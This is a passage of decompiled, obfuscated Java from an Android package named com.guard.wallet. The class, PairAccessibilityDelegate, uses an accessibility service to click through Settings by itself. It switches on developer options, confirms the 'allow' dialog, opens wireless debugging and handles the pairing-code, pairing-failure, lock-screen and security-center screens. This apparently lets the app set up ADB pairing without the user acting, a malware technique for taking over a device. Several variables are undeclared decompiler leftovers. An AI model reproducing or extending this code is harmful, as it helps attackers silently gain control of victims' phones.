   public final boolean T0(UiObject var1) {
      Exception var10000;
      label222: {
         UiObject var7;
         try {
            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
            var7 = var1.findOneByOperateOr(a0());
         } catch (Exception var33) {
            var10000 = var33;
            boolean var10001 = false;
            break label222;
         }

         UiObject var5 = var7;
         UiObject var6 = var1;
         if (var7 == null) {
            try {
               var1.scrollBackwardEnd();
               this.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
               com.guard.wallet.utils.g.T0(5);
               var1 = this.f0();
            } catch (Exception var32) {
               var10000 = var32;
               boolean var53 = false;
               break label222;
            }

            var5 = var7;
            var6 = var1;
            if (var1 != null) {
               try {
                  var5 = var1.findOneByOperateOr(a0());
               } catch (Exception var31) {
                  var10000 = var31;
                  boolean var54 = false;
                  break label222;
               }

               var6 = var1;
            }
         }

         var1 = var5;
         if (var5 == null) {
            var1 = var5;
            if (var6 != null) {
               try {
                  var7 = var6.findOneByOperateOr(b0());
               } catch (Exception var24) {
                  var10000 = var24;
                  boolean var55 = false;
                  break label222;
               }

               var1 = var7;
               if (var7 == null) {
                  try {
                     var6.scrollBackwardEnd();
                     this.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                     com.guard.wallet.utils.g.T0(5);
                     var6 = this.f0();
                  } catch (Exception var23) {
                     var10000 = var23;
                     boolean var56 = false;
                     break label222;
                  }

                  var1 = var7;
                  if (var6 != null) {
                     try {
                        var1 = var6.findOneByOperateOr(b0());
                     } catch (Exception var22) {
                        var10000 = var22;
                        boolean var57 = false;
                        break label222;
                     }
                  }
               }

               if (var1 != null) {
                  AtomicInteger var8;
                  try {
                     Log.d("PairAccessibilityDelegate", "开发者选项栏目查找成功");
                     var6 = var1.parent();
                     var8 = new AtomicInteger(0);
                  } catch (Exception var21) {
                     var10000 = var21;
                     boolean var58 = false;
                     break label222;
                  }

                  label225: {
                     label231: {
                        var7 = null;
                        Object var37 = null;
                        var5 = (UiObject)var37;
                        label198:
                        if (var6 != null) {
                           var5 = (UiObject)var37;
                           var1 = var7;

                           try {
                              if (!var6.checkable()) {
                                 break label198;
                              }
                           } catch (Exception var30) {
                              var10000 = var30;
                              boolean var59 = false;
                              break label231;
                           }

                           var5 = var6;
                        }

                        var1 = var5;

                        CombineFilter var9;
                        try {
                           var9 = Q0();
                        } catch (Exception var29) {
                           var10000 = var29;
                           boolean var60 = false;
                           break label231;
                        }

                        var1 = var5;

                        try {
                           MyAccessibilityService.I(var6);
                        } catch (Exception var28) {
                           var10000 = var28;
                           boolean var61 = false;
                           break label231;
                        }

                        var7 = var6;

                        while (true) {
                           var6 = var5;
                           if (var7 == null) {
                              break label225;
                           }

                           var6 = var5;
                           if (var5 != null) {
                              break label225;
                           }

                           var6 = var5;
                           var1 = var5;

                           try {
                              if (var8.incrementAndGet() > 5) {
                                 break label225;
                              }
                           } catch (Exception var27) {
                              var10000 = var27;
                              boolean var62 = false;
                              break;
                           }

                           var1 = var5;

                           try {
                              var5 = var7.findOneByCombine(var9);
                           } catch (Exception var26) {
                              var10000 = var26;
                              boolean var63 = false;
                              break;
                           }

                           var1 = var5;

                           try {
                              var7 = var7.parent();
                           } catch (Exception var25) {
                              var10000 = var25;
                              boolean var64 = false;
                              break;
                           }
                        }
                     }

                     Exception var45 = var10000;

                     try {
                        a1.q.s("PairAccessibilityDelegate", var45);
                     } catch (Exception var20) {
                        var10000 = var20;
                        boolean var65 = false;
                        break label222;
                     }

                     var6 = var1;
                  }

                  var1 = var6;
               } else {
                  try {
                     Log.e("PairAccessibilityDelegate", "开发者选项栏目查找失败");
                  } catch (Exception var19) {
                     var10000 = var19;
                     boolean var66 = false;
                     break label222;
                  }

                  var1 = var5;
               }
            }
         }

         boolean var2;
         boolean var3;
         if (var1 != null) {
            try {
               var3 = var1.checked();
            } catch (Exception var18) {
               var10000 = var18;
               boolean var67 = false;
               break label222;
            }

            if (!var3) {
               try {
                  var2 = var1.clickPosition(0.95F, 0.5F);
               } catch (Exception var17) {
                  var10000 = var17;
                  boolean var68 = false;
                  break label222;
               }
            } else {
               var2 = false;
            }
         } else {
            var3 = false;
            var2 = false;
         }

         if (var2) {
            try {
               var39 = new AtomicInteger(10);
               var2 = this.K();
            } catch (Exception var15) {
               var10000 = var15;
               boolean var69 = false;
               break label222;
            }

            boolean var4;
            while (true) {
               var4 = var2;
               if (var2) {
                  break;
               }

               try {
                  if (var39.decrementAndGet() < 0) {
                     break;
                  }

                  com.guard.wallet.utils.g.T0(1);
                  var2 = this.K();
               } catch (Exception var16) {
                  Exception var40 = var16;

                  try {
                     a1.q.s("PairAccessibilityDelegate", var40);
                     break;
                  } catch (Exception var14) {
                     var10000 = var14;
                     boolean var70 = false;
                     break label222;
                  }
               }
            }

            if (var4) {
               try {
                  Log.d("PairAccessibilityDelegate", "开发者选项已点击,已弹出允许开发设置对话框");
                  var1 = this.k().findOneByCombine(U());
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var71 = false;
                  break label222;
               }

               if (var1 != null) {
                  try {
                     if (var1.click()) {
                        Log.d("PairAccessibilityDelegate", "已点击允许打开开发者选项");
                        return true;
                     }
                  } catch (Exception var12) {
                     var10000 = var12;
                     boolean var72 = false;
                     break label222;
                  }
               }
            }
         }

         if (var3) {
            try {
               Log.d("PairAccessibilityDelegate", "开发者选项已勾选");
               return true;
            } catch (Exception var10) {
               var10000 = var10;
               boolean var73 = false;
            }
         } else {
            try {
               Log.e("PairAccessibilityDelegate", "开发者选项未勾选");
               return false;
            } catch (Exception var11) {
               var10000 = var11;
               boolean var74 = false;
            }
         }
      }

      Exception var42 = var10000;
      a1.q.s("PairAccessibilityDelegate", var42);
      return false;
   }

   @Override
   public final void d() {
      try {
         this.n.shutdownNow();
         com.guard.wallet.thread.l.a(super.c);
         this.o.clear();
         super.d();
      } catch (Exception var2) {
         a1.q.s("PairAccessibilityDelegate", var2);
      }
   }

   @Override
   public final boolean equals(Object var1) {
      return var1 instanceof a0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final UiObject f0() {
      Exception var10000;
      label37: {
         UiObject var1;
         CombineFiltersWithOr var2;
         AtomicInteger var3;
         try {
            if (this.k() == null) {
               return null;
            }

            var3 = new AtomicInteger(0);
            var1 = this.k();
            var2 = H0();
         } catch (Exception var6) {
            var10000 = var6;
            boolean var10001 = false;
            break label37;
         }

         while (true) {
            try {
               var1 = var1.findOneByOperateOr(var2);
            } catch (Exception var4) {
               var10000 = var4;
               boolean var9 = false;
               break;
            }

            if (var1 == null) {
               try {
                  if (var3.incrementAndGet() < 10) {
                     com.guard.wallet.utils.g.T0(5);
                     this.k().refresh();
                     var1 = this.k();
                     var2 = H0();
                     continue;
                  }
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var10 = false;
                  break;
               }
            }

            return var1;
         }
      }

      Exception var8 = var10000;
      a1.q.s("PairAccessibilityDelegate", var8);
      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final CheckedResult g0(UiObject var1, int var2) {
      boolean var4;
      CheckedResult var8;
      label206: {
         boolean var36;
         label205: {
            label208: {
               UiObject var7;
               label203: {
                  boolean var5;
                  Exception var10000;
                  label209: {
                     AtomicInteger var9;
                     label201: {
                        label200: {
                           var4 = false;
                           var5 = false;
                           var9 = new AtomicInteger(0);
                           var8 = new CheckedResult();
                           if (var1 != null) {
                              try {
                                 if (var1.checkable()) {
                                    break label200;
                                 }
                              } catch (Exception var29) {
                                 var10000 = var29;
                                 boolean var10001 = false;
                                 break label209;
                              }
                           }

                           var7 = null;
                           break label201;
                        }

                        var7 = var1;
                     }

                     CombineFilter var10;
                     try {
                        var10 = Q0();
                        MyAccessibilityService.I(var1);
                     } catch (Exception var27) {
                        var10000 = var27;
                        boolean var38 = false;
                        break label209;
                     }

                     while (var1 != null && var7 == null) {
                        try {
                           if (var9.incrementAndGet() > 3) {
                              break;
                           }

                           var7 = var1.findOneByCombine(var10);
                           var1 = var1.parent();
                        } catch (Exception var28) {
                           var10000 = var28;
                           boolean var39 = false;
                           break label209;
                        }
                     }

                     if (var7 == null) {
                        break label206;
                     }

                     try {
                        var36 = var7.checked();
                        break label203;
                     } catch (Exception var26) {
                        var10000 = var26;
                        boolean var40 = false;
                     }
                  }

                  var30 = var10000;
                  var4 = var5;
                  break label208;
               }

               Exception var37;
               label216: {
                  boolean var33;
                  int var3 = 20;
                  var33 = var36;
                  var2 = var3;
                  label172:
                  if (!var36) {
                     var4 = var36;
                     var33 = var36;
                     var2 = var3;

                     try {
                        if (!var7.click()) {
                           break label172;
                        }
                     } catch (Exception var25) {
                        var37 = var25;
                        boolean var41 = false;
                        break label216;
                     }

                     var4 = var36;

                     try {
                        var8.setClicked(true);
                     } catch (Exception var24) {
                        var37 = var24;
                        boolean var42 = false;
                        break label216;
                     }

                     var4 = var36;

                     try {
                        var7.refresh();
                     } catch (Exception var23) {
                        var37 = var23;
                        boolean var43 = false;
                        break label216;
                     }

                     var4 = var36;

                     try {
                        var36 = var7.checked();
                     } catch (Exception var22) {
                        var37 = var22;
                        boolean var44 = false;
                        break label216;
                     }

                     while (true) {
                        var33 = var36;
                        var2 = var3;
                        if (var3 <= 0) {
                           break;
                        }

                        var33 = var36;
                        var2 = var3;
                        if (var36) {
                           break;
                        }

                        var4 = var36;

                        try {
                           com.guard.wallet.utils.g.T0(1);
                        } catch (Exception var21) {
                           var37 = var21;
                           boolean var45 = false;
                           break label216;
                        }

                        var4 = var36;

                        try {
                           var7.refresh();
                        } catch (Exception var20) {
                           var37 = var20;
                           boolean var46 = false;
                           break label216;
                        }

                        var4 = var36;

                        try {
                           var36 = var7.checked();
                        } catch (Exception var19) {
                           var37 = var19;
                           boolean var47 = false;
                           break label216;
                        }

                        var3--;
                     }
                  }

                  var36 = var33;
                  if (var33) {
                     break label205;
                  }

                  var4 = var33;

                  try {
                     var1 = var7.findParentUtilCombine(T());
                  } catch (Exception var18) {
                     var37 = var18;
                     boolean var48 = false;
                     break label216;
                  }

                  var36 = var33;
                  if (var1 == null) {
                     break label205;
                  }

                  var4 = var33;
                  var36 = var33;

                  try {
                     if (!var1.click()) {
                        break label205;
                     }
                  } catch (Exception var17) {
                     var37 = var17;
                     boolean var49 = false;
                     break label216;
                  }

                  var4 = var33;

                  try {
                     var8.setClicked(true);
                  } catch (Exception var16) {
                     var37 = var16;
                     boolean var50 = false;
                     break label216;
                  }

                  var4 = var33;

                  try {
                     var7.refresh();
                  } catch (Exception var15) {
                     var37 = var15;
                     boolean var51 = false;
                     break label216;
                  }

                  var4 = var33;

                  try {
                     var33 = var7.checked();
                  } catch (Exception var14) {
                     var37 = var14;
                     boolean var52 = false;
                     break label216;
                  }

                  while (true) {
                     var36 = var33;
                     if (var2 <= 0) {
                        break label205;
                     }

                     var36 = var33;
                     if (var33) {
                        break label205;
                     }

                     var4 = var33;

                     try {
                        com.guard.wallet.utils.g.T0(1);
                     } catch (Exception var13) {
                        var37 = var13;
                        boolean var53 = false;
                        break;
                     }

                     var4 = var33;

                     try {
                        var7.refresh();
                     } catch (Exception var12) {
                        var37 = var12;
                        boolean var54 = false;
                        break;
                     }

                     var4 = var33;

                     try {
                        var33 = var7.checked();
                     } catch (Exception var11) {
                        var37 = var11;
                        boolean var55 = false;
                        break;
                     }

                     var2--;
                  }
               }

               var30 = var37;
            }

            a1.q.s("PairAccessibilityDelegate", var30);
            break label206;
         }

         var4 = var36;
      }

      var8.setChecked(var4);
      return var8;
   }

   @Override
   public final int hashCode() {
      return Objects.hash(a0.class.getName());
   }

   // $VF: Handled exception range with multiple entry points by splitting it
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      Exception var10000;
      label216: {
         try {
            if (this.r.get()) {
               return;
            }
         } catch (Exception var31) {
            var10000 = var31;
            boolean var10001 = false;
            break label216;
         }

         if (var1 != null) {
            try {
               super.u(var1, var2, var3);
            } catch (Exception var30) {
               var10000 = var30;
               boolean var48 = false;
               break label216;
            }
         }

         boolean var6;
         try {
            var6 = this.L();
         } catch (Exception var29) {
            var10000 = var29;
            boolean var49 = false;
            break label216;
         }

         r.g var7 = r.g.d;
         AtomicReference var41 = this.p;
         ConcurrentLinkedQueue var32 = this.o;
         boolean var5 = true;
         var2 = super.c;
         label203:
         if (var6) {
            r.g var8;
            Object var9;
            try {
               var32.remove("pairInWifiDebugWindow");
               var32.remove("pairInPairCodeDialog");
               var32.remove("pairInPairFailDialog");
               var32.remove("pairInConfirmLock");
               var32.remove("pairInSecurityCenter");
               var9 = var41.get();
               var8 = r.g.b;
            } catch (Exception var18) {
               var10000 = var18;
               boolean var50 = false;
               break label203;
            }

            if (var9 == var8) {
               try {
                  if (!var32.contains("pairInDevOption")) {
                     var32.add("pairInDevOption");
                     var9 = new y(this, 0);
                     com.guard.wallet.thread.l.c((Runnable)var9, var2);
                  }
               } catch (Exception var17) {
                  var10000 = var17;
                  boolean var51 = false;
                  break label203;
               }
            }

            try {
               if (var41.get() == r.g.e && !var32.contains("pairInDevOption")) {
                  var41.set(var8);
                  var32.add("pairInDevOption");
                  y var46 = new y(this, 1);
                  com.guard.wallet.thread.l.c(var46, var2);
               }
            } catch (Exception var16) {
               var10000 = var16;
               boolean var52 = false;
               break label203;
            }

            label136: {
               try {
                  if (var41.get() != var7 && var41.get() != r.g.g) {
                     break label136;
                  }
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var53 = false;
                  break label203;
               }

               try {
                  if (!var32.contains("pairInPrepareFinish")) {
                     var32.add("pairInPrepareFinish");
                     y var33 = new y(this, 2);
                     com.guard.wallet.thread.l.c(var33, var2);
                  }
               } catch (Exception var14) {
                  var10000 = var14;
                  boolean var54 = false;
                  break label203;
               }
            }

            try {
               return;
            } catch (Exception var13) {
               var10000 = var13;
               boolean var55 = false;
            }
         } else {
            label202: {
               label218: {
                  label221: {
                     label198: {
                        try {
                           if (!this.P()) {
                              break label221;
                           }

                           var32.remove("pairInDevOption");
                           var32.remove("pairInPairCodeDialog");
                           var32.remove("pairInConfirmLock");
                           if (var41.get() == var7) {
                              if (var32.contains("pairInPairSuccess")) {
                                 break label218;
                              }

                              var32.add("pairInPairSuccess");
                              var34 = new y(this, 3);
                              break label198;
                           }
                        } catch (Exception var28) {
                           var10000 = var28;
                           boolean var56 = false;
                           break label202;
                        }

                        try {
                           if (var32.contains("pairInWifiDebugWindow")) {
                              break label218;
                           }

                           var32.add("pairInWifiDebugWindow");
                           var34 = new y(this, 4);
                        } catch (Exception var27) {
                           var10000 = var27;
                           boolean var57 = false;
                           break label202;
                        }
                     }

                     try {
                        com.guard.wallet.thread.l.c(var34, var2);
                        break label218;
                     } catch (Exception var26) {
                        var10000 = var26;
                        boolean var58 = false;
                        break label202;
                     }
                  }

                  boolean var4;
                  label179: {
                     label178: {
                        try {
                           LinkedList var43 = new LinkedList();
                           var43.add(J());
                           var43.add(r0());
                           if (this.q(var43)) {
                              Log.d("PairAccessibilityDelegate", "已进入是否允许此网络无线调试对话框");
                              break label178;
                           }
                        } catch (Exception var25) {
                           Exception var42 = var25;

                           try {
                              a1.q.s("PairAccessibilityDelegate", var42);
                           } catch (Exception var24) {
                              var10000 = var24;
                              boolean var60 = false;
                              break label202;
                           }
                        }

                        var4 = false;
                        break label179;
                     }

                     var4 = true;
                  }

                  if (var4) {
                     try {
                        var32.remove("pairInWifiDebugWindow");
                        var32.remove("pairInDevOption");
                        return;
                     } catch (Exception var12) {
                        var10000 = var12;
                        boolean var61 = false;
                        break label202;
                     }
                  } else {
                     try {
                        if (this.M() && !this.Q()) {
                           var32.remove("pairInWifiDebugWindow");
                           if (!var32.contains("pairInPairCodeDialog")) {
                              var32.add("pairInPairCodeDialog");
                              y var39 = new y(this, 5);
                              com.guard.wallet.thread.l.c(var39, var2);
                           }

                           return;
                        }
                     } catch (Exception var23) {
                        var10000 = var23;
                        boolean var62 = false;
                        break label202;
                     }

                     try {
                        if (this.N()) {
                           if (!var32.contains("pairInPairFailDialog")) {
                              var32.add("pairInPairFailDialog");
                              y var38 = new y(this, 6);
                              com.guard.wallet.thread.l.c(var38, var2);
                           }

                           return;
                        }
                     } catch (Exception var22) {
                        var10000 = var22;
                        boolean var63 = false;
                        break label202;
                     }

                     label159: {
                        label158: {
                           try {
                              if (this.q(o.i.L())) {
                                 Log.d("PairAccessibilityDelegate", "已进入锁屏密码验证窗口");
                                 break label158;
                              }
                           } catch (Exception var21) {
                              Exception var44 = var21;

                              try {
                                 a1.q.s("PairAccessibilityDelegate", var44);
                              } catch (Exception var20) {
                                 var10000 = var20;
                                 boolean var64 = false;
                                 break label202;
                              }
                           }

                           var4 = false;
                           break label159;
                        }

                        var4 = var5;
                     }

                     if (var4) {
                        try {
                           if (!var32.contains("pairInConfirmLock")) {
                              var32.add("pairInConfirmLock");
                              y var35 = new y(this, 7);
                              com.guard.wallet.thread.l.c(var35, var2);
                           }

                           return;
                        } catch (Exception var11) {
                           var10000 = var11;
                           boolean var65 = false;
                           break label202;
                        }
                     } else {
                        try {
                           if (this.O()) {
                              y var37 = new y(this, 8);
                              com.guard.wallet.thread.l.c(var37, var2);
                           }

                           return;
                        } catch (Exception var19) {
                           var10000 = var19;
                           boolean var66 = false;
                           break label202;
                        }
                     }
                  }
               }

               try {
                  return;
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var59 = false;
               }
            }
         }
      }

      Exception var36 = var10000;
      a1.q.s("PairAccessibilityDelegate", var36);
   }
}
